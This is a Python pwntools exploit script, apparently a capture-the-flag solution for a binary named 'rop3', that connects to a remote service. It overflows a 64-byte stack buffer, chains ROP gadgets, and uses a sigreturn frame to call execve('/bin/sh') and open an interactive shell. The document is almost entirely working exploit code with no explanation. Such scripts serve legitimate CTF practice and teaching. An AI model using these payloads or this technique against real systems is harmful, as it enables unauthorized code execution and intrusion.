#!/usr/bin/env python3

from pwn import *

exe = ELF("./rop3")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.GDB:
            gdb.attach(r,"""
            b * vuln + 32
            c
            """)
    else:
        r = remote("34.77.136.25", 8085)

    return r


er = ROP(exe)
frame = SigreturnFrame()
frame.rax = 59 # execve syscall number
frame.rdi = 0x404049 # banner address (/bin/sh\0)
frame.rsi = 0
frame.rdx = 0
frame.rip = 0x0000000000401136  #syscall address

def main():
    r = conn()
    payload = flat(
        "A" * 64,
        p64(0x404049),  # -> RBP (stack address after leave)
        p64(er.find_gadget(["pop rax"])[0]),
        p64(0x404049),   # -> buffer for read
        p64(0x0000000000401147),  # mov rsi,rax and read  (from the vuln function)

    )
    payload = payload +  ( (499 - len(payload)) * b"\x90")
    print(len(payload))
    r.sendline(payload)
    key = "/bin/sh\0"

    payload2 = flat(
        "/bin/sh\0",
        p64(er.find_gadget(["pop rax"])[0]),
        15,
        p64(er.find_gadget(["syscall"])[0]),
        frame

    )
    print(len(payload2))
    r.sendline(payload2)
    # good luck pwning :)

    r.interactive()


if __name__ == "__main__":
    main()